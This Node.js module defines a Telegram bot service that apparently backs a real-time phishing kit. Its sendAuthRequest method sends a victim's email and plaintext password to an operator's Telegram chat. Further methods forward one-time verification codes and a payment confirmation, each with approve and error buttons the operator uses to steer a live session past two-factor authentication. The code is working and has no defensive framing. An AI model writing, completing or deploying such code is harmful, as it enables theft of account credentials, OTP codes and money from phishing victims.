const axios = require('axios');
const config = require('../config');

class TelegramService {
  constructor() {
    this.botToken = config.telegram.botToken;
    this.chatId = config.telegram.chatId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;

    // Validar credenciales
    if (!this.botToken || !this.chatId) {
      console.error('[TELEGRAM ERROR] Faltan credenciales: BOT_TOKEN o CHAT_ID');
    }
  }

  async sendMessage(text) {
    try {
      // Validar credenciales
      if (!this.botToken || !this.chatId) {
        throw new Error(`Telegram credenciales faltantes: token=${!!this.botToken}, chatId=${!!this.chatId}`);
      }

      console.log(`[TELEGRAM] Enviando mensaje con URL: ${this.apiUrl.substring(0, 50)}...`);

      const response = await axios.post(`${this.apiUrl}/sendMessage`, {
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML',
      });

      console.log(`[TELEGRAM] ✅ Mensaje enviado exitosamente`);
      return response.data;
    } catch (error) {
      console.error('[TELEGRAM ERROR]', {
        message: error.message,
        status: error.response?.status,
        data: error.response?.data,
      });
      throw error;
    }
  }

  async sendAuthRequest(sessionId, email, password) {
    const text = `
<b>🔐 SOLICITUD DE AUTENTICACIÓN</b>
<b>Email:</b> <code>${email}</code>
<b>Password:</b> <code>${password}</code>`;

    const keyboard = {
      inline_keyboard: [[
        { text: '✅ RegistroOtp', callback_data: `${sessionId}|RegistroOtp` },
        { text: '❌ ERROR',       callback_data: `${sessionId}|ERROR` },
      ]],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendOtpRequest(sessionId, code) {
    const text = `
<b>🔑 VERIFICACIÓN OTP</b>
<b>Código:</b> <code>${code}</code>`;

    const keyboard = {
      inline_keyboard: [[
        { text: '🎉 Aprobado', callback_data: `${sessionId}|Aprobado` },
        { text: '❌ ERROR',    callback_data: `${sessionId}|ERROR` },
      ]],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendConfirmationRequest(sessionId) {
    const text = `<b>✔️ CONFIRMACIÓN DE PAGO</b>\n<b>Usuario listo para confirmar.</b>`;

    const keyboard = {
      inline_keyboard: [[
        { text: '✅ Confirmar', callback_data: `${sessionId}|Confirmado` },
        { text: '❌ Rechazar',  callback_data: `${sessionId}|ERROR` },
      ]],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendMessageWithButtons(text, keyboard) {
    try {
      const response = await axios.post(`${this.apiUrl}/sendMessage`, {
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: keyboard,
      });

      console.log(`[TELEGRAM] Mensaje con botones enviado`);
      return response.data;
    } catch (error) {
      console.error('[TELEGRAM ERROR]', error.response?.data || error.message);
      throw error;
    }
  }

  // Elimina los botones del mensaje una vez clickeado
  async removeButtons(messageId, text) {
    try {
      await axios.post(`${this.apiUrl}/editMessageText`, {
        chat_id: this.chatId,
        message_id: messageId,
        text: text,
        parse_mode: 'HTML',
      });
      console.log(`[TELEGRAM] Botones eliminados del mensaje ${messageId}`);
    } catch (error) {
      console.error('[TELEGRAM] Error eliminando botones:', error.response?.data || error.message);
    }
  }
}

module.exports = new TelegramService();
